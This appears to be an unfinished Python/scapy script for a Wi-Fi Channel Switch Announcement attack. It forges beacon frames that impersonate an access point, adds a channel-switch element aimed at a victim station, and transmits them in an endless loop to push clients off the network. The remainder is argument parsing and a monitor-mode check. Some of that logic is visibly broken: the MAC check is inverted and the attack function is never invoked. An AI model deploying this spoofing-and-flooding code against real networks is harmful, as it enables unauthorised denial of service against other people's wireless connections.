from scapy.all import *
import time
import sys
import argparse

def csa_attack(iface, ssid, ap_mac, victim):#, count):
	print('[*] CSA Attack!')
	dot11 = Dot11(type=0, subtype=8, addr1=victim, addr2=ap_mac, addr3=ap_mac)
	beacon = Dot11Beacon(cap=0x401, timestamp=int(time.time()))
	essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
	dsparam = Dot11Elt(ID=0x3,len=1,info=b'\x28')

	csa = Dot11Elt(ID=0x25,len=3,info=b'\x00\xff\x01')

	#frame = RadioTap()/dot11/beacon/essid/dsparam/csa
	frame = RadioTap()/dot11/beacon/essid/csa
	print('[*] Start...!!')
	sendp(frame, iface=iface, inter=0.0, loop=1)
	# send -> No Working
	#send(frame, iface=iface,count=int(count),inter=0.0,loop=1)

class PARSER:
	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.channel = self.channel(opts.channel)
		self.ap = self.mac(opts.ap)
		self.sta = self.mac(opts.sta)

		self.casting = opts.cast
		self.aggressive = opts.aggressive
	
	def help(self, _help):
		if _help:
			print("HELPPPPPP")

	def mac(self, bssid):
		print(bssid)
		if bssid:
			print("No BSSID Given")
			exit(-1)
		return bssid

	def channel(self, ch):
		retval = list(range(1,164))
		if ch:
			if ch in retval:
				return [ch]
			else:
				print("Invalid Channel Given.")
		else:
			return retval
	
	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					print("Interface Not In Monitor Mode [%s]" % (iface))
					exit(-1)
			else:
				print("Interface Not Found. [%s]" % (iface))
				exit(-1)
		else:
			print("Interface Not Provided. Specify an Interface!")
			exit(-1)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help', dest='help', default=False, action="store_true")
	
	parser.add_argument('-i', '--interface', dest='interface', default="", type=str)
	parser.add_argument('-c', '--channel', dest='channel', default=0, type=int)
	parser.add_argument('-a', '--accesspoint', dest='ap', default="", type=str)
	parser.add_argument('-s', '--station', dest='sta', default="", type=str)

	parser.add_argument('-d', '--casting', dest='cast', default="broadcast", type=str)
	
	parser.add_argument('--aggressive', dest='aggressive', default=False, type=bool)

	options = parser.parse_args()
	parser = PARSER(options)
	print(f"interface: {parser.interface}\nChannel: {parser.channel}\nAP: {parser.ap}\nSTA: {parser.sta}\ncasting: {parser.casting}")